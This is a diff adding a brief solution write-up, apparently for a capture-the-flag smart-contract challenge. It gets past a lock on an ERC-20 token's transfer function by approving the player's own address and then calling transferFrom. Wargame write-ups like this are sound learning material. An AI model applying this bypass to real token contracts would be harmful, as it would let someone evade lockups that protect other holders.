@@ -1,0 +1,12 @@
+Solution:
+Check your starting token balance:
+await contract.balanceOf(player).then(x=>x.toString())
+Call ERC-20's approve function on this amount:
+const valueInWei = toWei("1000000", "ether");
+await contract.approve(player, valueInWei)
+Call ERC-20's transferFrom function on this amount:
+await contract.transferFrom(player, any_random_address, valueInWei)
+
+Other Notes:
+-the ERC 20 transfer function, which inherits from the parent, was being restricted
+with a modifier.  Had to use ERC-20's transferFrom().
